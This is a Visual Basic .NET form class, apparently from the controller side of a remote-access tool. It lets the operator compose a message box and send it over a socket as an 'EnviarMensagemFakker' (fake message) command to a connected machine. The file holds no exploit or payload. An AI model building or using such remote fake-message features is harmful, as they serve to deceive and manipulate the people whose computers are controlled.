Public Class FrmMsgBox

    Public sk As MdClient

    Private Sub btnTestar_Click(sender As Object, e As EventArgs) Handles btnTestar.Click
        Dim x As MessageBoxIcon
        Dim y As MessageBoxButtons

        If RBInformações.Checked = True Then
            x = MessageBoxIcon.Information
        ElseIf RBQuestão.Checked Then
            x = MessageBoxIcon.Question
        ElseIf RBAviso.Checked Then
            x = MessageBoxIcon.Warning
        ElseIf RBError.Checked Then
            x = MessageBoxIcon.Error
        Else
            x = MessageBoxIcon.Asterisk
        End If

        If RBSimNão.Checked Then
            y = MessageBoxButtons.YesNo
        ElseIf RBSimNãoCancelar.Checked Then
            y = MessageBoxButtons.YesNoCancel
        ElseIf RBOk.Checked Then
            y = MessageBoxButtons.OK
        ElseIf RBOkCancelar.Checked Then
            y = MessageBoxButtons.OKCancel
        ElseIf RBRepetirCancelar.Checked Then
            y = MessageBoxButtons.RetryCancel

        ElseIf RBAbortarRepetirCancelar.Checked Then
            y = MessageBoxButtons.AbortRetryIgnore
        Else
            y = MessageBoxButtons.OK
        End If
        MessageBox.Show(txtMensagem.Text, txtTitulo.Text, y, x)

    End Sub

    Private Sub btnEnviar_Click(sender As Object, e As EventArgs) Handles btnEnviar.Click
        sk.Send("EnviarMensagemFakker" & MdSokserver.Y & messageicon & MdSokserver.Y & messagebutton & MdSokserver.Y & title & MdSokserver.Y & message)
    End Sub

    Public ReadOnly Property title
        Get
            Return txtTitulo.Text
        End Get
    End Property
    Public ReadOnly Property message
        Get
            Return txtMensagem.Text
        End Get
    End Property
    Public ReadOnly Property messageicon
        Get
            If RBInformações.Checked Then
                Return "1"
            ElseIf RBQuestão.Checked Then
                Return "2"
            ElseIf RBAviso.Checked Then
                Return "3"
            ElseIf RBError.Checked Then
                Return "4"
            Else
                Return "1"
            End If
        End Get
    End Property
    Public ReadOnly Property messagebutton
        Get
            If RBSimNão.Checked Then
                Return "1"
            ElseIf RBSimNãoCancelar.Checked Then
                Return "2"
            ElseIf RBOk.Checked Then
                Return "3"
            ElseIf RBOkCancelar.Checked Then
                Return "4"
            ElseIf RBRepetirCancelar.Checked Then
                Return "5"
            ElseIf RBAbortarRepetirCancelar.Checked Then
                Return "6"
            Else
                Return "1"
            End If
        End Get
    End Property

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        RBInformações.Checked = True
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        RBQuestão.Checked = True
    End Sub

    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        RBAviso.Checked = True
    End Sub

    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        RBError.Checked = True
    End Sub
End Class